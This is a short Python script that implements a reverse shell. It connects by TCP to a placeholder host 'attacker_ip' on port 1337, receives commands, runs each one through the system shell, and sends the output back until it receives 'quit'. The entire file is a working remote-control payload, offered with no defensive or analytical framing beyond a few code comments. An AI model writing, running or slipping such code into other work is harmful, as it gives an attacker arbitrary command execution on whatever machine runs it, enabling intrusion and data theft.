import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	
	if cmd == b"quit":
		payload.close()
		break
		
	cmd = cmd.decode("utf-8") # string

	# Handle Exception
	try:
		output = subprocess.check_output(cmd, shell = True)
	# Check if there's exception
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected") # display disconnection message